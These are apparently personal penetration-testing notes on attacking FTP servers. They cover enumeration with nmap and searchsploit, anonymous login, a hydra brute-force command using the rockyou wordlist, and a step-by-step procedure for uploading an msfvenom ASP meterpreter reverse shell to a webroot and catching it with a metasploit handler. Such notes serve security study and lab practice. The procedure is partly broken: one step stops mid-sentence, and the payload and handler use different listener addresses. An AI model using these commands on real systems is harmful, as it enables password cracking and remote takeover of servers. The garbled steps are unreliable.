## FTP
File Transfer Protocol
- Protocol to transfer files between hosts
- port 21
- can be anonymous or authenticated
- login anonymous if allowed
- commonly used for webserver

### Good to know
- binary mode sends files as they are
- ascii mode converts files to ascii
- switch between modes with `binary` and `ascii`

### FTP Commands
```sh
ftp 10.129.228.195
-h help
```

#### On ftp shell:
```sh
help #hilfe
dir #show directory
get #download file
cd #change directory
put /home/test/test.txt #upload file
```
### FTP Enumeration

#### Nmap
```sh
nmap -sV -sC 192.254.1.1 -p21 #default scan find already anonymous login is allowed and read or writeable
```

#### searchsploit 
femitter is a ftp server type name
```sh
searchsploit femitter #search for exploits
```

### FTP Annonymous Login
if anonymous ftp login allowed then user username: anonymous
```
username: anonymous
password: any
```

### Login bruteforce
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.255.1.231 ftp #bruteforce ftp with rockyou list
-l # username 
-P # passwordlist target protocol
```
```
Google for ftp default login data with the target server version / ftp client name:
- admin: password
- admin: admin
- etc. depending on ftp server version
```
### Reverse Shell over FTP  

1. Create reverse shell with msfvenom
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.254.1.229 LPORT=4444 -f asp > shell.asp

#asp: if the target is a asp server
```
2. That creates an asp shell script which can be
3. Accepting the shell with metasploit:
```shell
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.254.1.228; set lport 4444; run -j"
```
4. Put  the shell.asp in webroot of ftp and try to open in browser.
5. Than open it in browser to execute the shell.

